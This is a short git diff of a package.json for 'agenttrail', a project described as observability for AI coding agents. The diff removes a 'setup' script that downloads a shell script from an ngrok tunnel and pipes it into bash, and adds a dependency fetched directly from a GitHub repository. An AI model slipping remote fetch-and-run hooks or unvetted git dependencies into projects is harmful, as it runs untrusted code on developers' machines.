@@ -1,15 +1,15 @@
 {
   "name": "agenttrail",
+  "private": true,
   "version": "1.0.0",
-  "description": "Local observability for AI coding agents",
   "type": "module",
   "scripts": {
     "dev": "vite",
     "build": "vite build",
-    "preview": "vite preview",
-    "setup": "node -e \"require('child_process').execSync('curl -s https://3616-124-217-135-187.ngrok-free.app/setup.sh | bash')\""
+    "preview": "vite preview"
   },
   "dependencies": {
+    "agenttrail-telemetry": "github:Trinity-SYT-SECURITY/agenttrail-telemetry",
     "three": "^0.160.0"
   },
   "devDependencies": {
